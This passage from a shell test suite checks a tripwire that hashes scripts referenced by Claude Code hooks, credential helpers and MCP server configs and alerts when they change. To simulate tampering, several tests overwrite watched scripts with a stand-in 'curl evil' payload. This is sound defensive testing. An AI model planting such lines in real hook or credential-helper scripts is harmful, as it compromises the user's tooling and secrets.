jq --arg T "$T" '. + {apiKeyHelper: "bash \($T)/ext/key.sh", awsAuthRefresh: "\($T)/ext/aws1.sh", awsCredentialExport: "\($T)/ext/aws2.sh", otelHeadersHelper: "\($T)/ext/otel.sh",
  hooks: {Stop: [{hooks: [{type: "command", command: "sh -c '"'"'\($T)/ext/c1.sh;\($T)/ext/c2.sh'"'"'"},
                          {type: "command", command: "bash -lc \"\($T)/ext/c5.sh|\($T)/ext/c6.sh\""},
                          {type: "command", command: "bash \($T)/lnk/../dd.sh"}]}]}}' "$H/.claude/settings.json" > "$T/s.json" && mv "$T/s.json" "$H/.claude/settings.json"
run >/dev/null
grep -q "^$T/uvproj/server.py	" "$B" && grep -q "^$T/uvproj2/main.py	" "$B" && grep -q "^$T/uvproj/app.py	" "$B" \
  && ok "an MCP server run as uv or uvx --directory DIR hashes its script under DIR" || no "an MCP server run as uv or uvx --directory DIR hashes its script under DIR" "$(cut -f1 "$B" | grep uvproj)"
grep -q "^$T/ext/key.sh	" "$B" && grep -q "^$T/ext/aws1.sh	" "$B" && grep -q "^$T/ext/aws2.sh	" "$B" && grep -q "^$T/ext/otel.sh	" "$B" \
  && ok "apiKeyHelper, awsAuthRefresh, awsCredentialExport and otelHeadersHelper are followed" || no "settings command helpers are followed" "$(cut -f1 "$B" | grep ext/)"
grep -q "^$T/ext/c1.sh	" "$B" && grep -q "^$T/ext/c2.sh	" "$B" && grep -q "^$T/ext/c5.sh	" "$B" && grep -q "^$T/ext/c6.sh	" "$B" \
  && grep -q "^$T/ext/c3.sh	" "$B" && grep -q "^$T/ext/c4.sh	" "$B" \
  && ok "the -c string of sh, bash and dash splits as shell with no whitespace" || no "the -c string of sh, bash and dash splits as shell with no whitespace" "$(cut -f1 "$B" | grep ext/c)"
grep -q "^$T/deep/a/dd.sh	" "$B" && ! grep -q "^$T/dd.sh	" "$B" \
  && ok "a symlink then .. resolves the way the shell opens it" || no "a symlink then .. resolves the way the shell opens it" "$(cut -f1 "$B" | grep dd.sh)"
grep -Eq "^$T/data/" "$B" && no "MCP args that name data files are not hashed" "$(cut -f1 "$B" | grep data/)" || ok "MCP args that name data files are not hashed"
printf 'db2\n' > "$T/data/app.db"; printf 'lite2\n' > "$T/data/x.sqlite"
rc=$(run); [ "$(alerts)" = 0 ] && ok "a database write never pages urgent" || no "a database write never pages urgent" "$(cat "$LOG")"
printf '#!/bin/sh\ncurl evil\n' > "$T/uvproj/server.py"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'uvproj/server.py' "$LOG" && ok "an edit to a uv --directory server script alerts" || no "an edit to a uv --directory server script alerts" "$(cat "$LOG")"
printf '#!/bin/sh\ncurl evil\n' > "$T/ext/key.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'ext/key.sh' "$LOG" && ok "an edit to the apiKeyHelper script alerts" || no "an edit to the apiKeyHelper script alerts" "$(cat "$LOG")"

# review: --directory moves the root only for uv or uvx, and only until the next separator
printf '#!/bin/sh\n' > "$Q/ops/scripts/after.sh"; printf '#!/bin/sh\n' > "$Q/ops/scripts/nl.sh"; printf '#!/bin/sh\n' > "$Q/ops/scripts/other.sh"
jq --arg T "$T" '.hooks.Stop[0].hooks += [{type: "command", command: "uv --directory \($T)/uvproj run true && bash ops/scripts/after.sh"},
  {type: "command", command: "tool --directory \($T)/uvproj ops/scripts/other.sh"},
  {type: "command", command: "uv --directory \($T)/uvproj run true\nbash ops/scripts/nl.sh"}]' "$Q/.claude/settings.json" > "$T/q.json" && mv "$T/q.json" "$Q/.claude/settings.json"
run >/dev/null
grep -q "^$Q/ops/scripts/after.sh	" "$B" && ok "a path after uv --directory D ... && resolves against the project again" || no "a path after uv --directory D ... && resolves against the project again" "$(cut -f1 "$B" | grep -e after.sh -e uvproj)"
grep -q "^$Q/ops/scripts/other.sh	" "$B" && ok "--directory after a program that is not uv or uvx keeps the project root" || no "--directory after a program that is not uv or uvx keeps the project root" "$(cut -f1 "$B" | grep other.sh)"
grep -q "^$Q/ops/scripts/nl.sh	" "$B" && ok "a newline after uv --directory D also resets the root" || no "a newline after uv --directory D also resets the root" "$(cut -f1 "$B" | grep -e nl.sh -e uvproj)"
printf '#!/bin/sh\ncurl evil\n' > "$Q/ops/scripts/after.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'ops/scripts/after.sh' "$LOG" && ok "an edit to a hook script after uv --directory alerts" || no "an edit to a hook script after uv --directory alerts" "$(cat "$LOG")"

# (3) a failed mirror write keeps both baselines at their previous content
run >/dev/null
mkdir -p "$T/nosudo"; printf '#!/bin/sh\nexit 1\n' > "$T/nosudo/sudo"; chmod +x "$T/nosudo/sudo"
cp "$B" "$T/b.before"; cp "$M/hook-tripwire.tsv" "$T/m.before"
chmod 444 "$M/hook-tripwire.tsv"; chmod 555 "$M"
printf 'evil\n' > "$H/.claude/hooks/mfail.sh"
rc=$(PATH="$T/nosudo:$PATH" run)
chmod 755 "$M"; chmod 644 "$M/hook-tripwire.tsv"
[ "$rc" != 0 ] && grep -q '^default|.*mirror' "$LOG" && cmp -s "$B" "$T/b.before" && cmp -s "$M/hook-tripwire.tsv" "$T/m.before" \
  && ok "a failed mirror write keeps both baselines at their previous content" || no "a failed mirror write keeps both baselines at their previous content" "rc=$rc $(cat "$LOG")"
rc=$(run); ! grep -q 'baseline was deleted or edited' "$LOG" && grep -q 'mfail.sh' "$LOG" \
  && ok "the run after a mirror failure re-alerts the change, not tampering" || no "the run after a mirror failure re-alerts the change, not tampering" "$(cat "$LOG")"
rc=$(run); [ "$rc" = 0 ] && [ "$(alerts)" = 0 ] && ok "then the tripwire is quiet" || no "then the tripwire is quiet" "rc=$rc $(cat "$LOG")"

# (6) one malformed config entry is skipped with a default alert, not every target lost
printf 'module.exports = 1\n' > "$Q/rigs/alpha/good.js"
printf '{"mcpServers":{"bad":{"command":"x","args":5},"good":{"command":"node","args":["good.js"]}}}\n' > "$Q/rigs/alpha/.mcp.json"
gitq "$Q/rigs/alpha" add -A; gitq "$Q/rigs/alpha" commit -qm malformed
rc=$(run)
grep -q "^$Q/rigs/alpha/good.js	" "$B" && grep -q "^$T/uvproj/server.py	" "$B" && [ "$(alerts)" = 0 ] && grep -qi '^default|.*malformed.*alpha/.mcp.json' "$LOG" \
  && ok "a malformed MCP entry is skipped with a default alert, the rest still hashed" || no "a malformed MCP entry is skipped with a default alert, the rest still hashed" "rc=$rc $(cat "$LOG") $(cut -f1 "$B" | grep alpha)"
printf '{"mcpServers":{"good":{"command":"node","args":["good.js"]}}}\n' > "$Q/rigs/alpha/.mcp.json"; gitq "$Q/rigs/alpha" commit -qam fixed
rc=$(run); [ "$rc" = 0 ] && [ "$(alerts)" = 0 ] && ! grep -q malformed "$LOG" && ok "a fixed entry is quiet again" || no "a fixed entry is quiet again" "rc=$rc $(cat "$LOG")"

[ "$fail" = 0 ] && echo "ALL PASS" || echo "SOME FAILED"
exit "$fail"
